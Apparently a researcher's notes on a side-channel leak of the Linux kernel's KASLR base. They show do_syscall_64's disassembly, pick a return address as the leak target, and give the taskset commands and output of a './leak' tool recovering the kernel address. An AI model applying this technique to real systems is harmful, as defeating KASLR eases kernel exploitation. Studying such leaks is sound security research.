1. Find our target to leak, which is a return address, loaded from stack and then quickly override by another call

```
sudo cat /proc/kallsyms | grep do_syscall_64
ffffffffb9deca90 T do_syscall_64

ffffffff81beca90 <do_syscall_64>:
ffffffff81beca90:   55                      push   %rbp
ffffffff81beca91:   49 89 f8                mov    %rdi,%r8
ffffffff81beca94:   48 89 e5                mov    %rsp,%rbp
ffffffff81beca97:   41 54                   push   %r12
ffffffff81beca99:   49 89 f4                mov    %rsi,%r12
ffffffff81beca9c:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
ffffffff81becaa1:   4c 89 c6                mov    %r8,%rsi
ffffffff81becaa4:   4c 89 e7                mov    %r12,%rdi
ffffffff81becaa7:   e8 84 41 00 00          callq  ffffffff81bf0c30 <syscall_enter_from_user_mode>
ffffffff81becaac:   48 3d be 01 00 00       cmp    $0x1be,%rax
ffffffff81becab2:   77 52                   ja     ffffffff81becb06 <do_syscall_64+0x76>
ffffffff81becab4:   48 3d bf 01 00 00       cmp    $0x1bf,%rax
ffffffff81becaba:   48 19 d2                sbb    %rdx,%rdx
ffffffff81becabd:   48 21 d0                and    %rdx,%rax
ffffffff81becac0:   4c 89 e7                mov    %r12,%rdi
ffffffff81becac3:   48 8b 04 c5 e0 02 00    mov    -0x7dfffd20(,%rax,8),%rax
ffffffff81becaca:   82 
ffffffff81becacb:   e8 50 59 21 00          callq  ffffffff81e02420 <__x86_indirect_thunk_rax>
// we try to leak this return value i.e ffffffff????cad0
ffffffff81becad0:   49 89 44 24 50          mov    %rax,0x50(%r12)
ffffffff81becad5:   4c 89 e7                mov    %r12,%rdi
ffffffff81becad8:   e8 b3 41 00 00          callq  ffffffff81bf0c90 <syscall_exit_to_user_mode>
ffffffff81becadd:   4c 8b 65 f8             mov    -0x8(%rbp),%r12
ffffffff81becae1:   c9                      leaveq
ffffffff81becae2:   c3                      retq


static __always_inline bool do_syscall_x64(struct pt_regs *regs, int nr) // inlined
{
    /*
     * Convert negative numbers to very high and thus out of range
     * numbers for comparisons.
     */
    unsigned int unr = nr;

    if (likely(unr < NR_syscalls)) {
        unr = array_index_nospec(unr, NR_syscalls);
        regs->ax = sys_call_table[unr](regs);
        //is source code, is this location
        return true;
    }
    return false;
}

```

2. leak kaslr base!

```
$ taskset -c "35" ./uname & taskset -c "71" ./leak 0xcad0

using suffix 0xcad0028 0x1c 1
082 0x52 1
129 0x81 7
140 0x8c 1
190 0xbe 1
222 0xde 21
225 0xe1 1
255 0xff 1
leaked_value: ffffffff00decad0
185 0xb9 20
leaked_value: ffffffffb9decad0
```

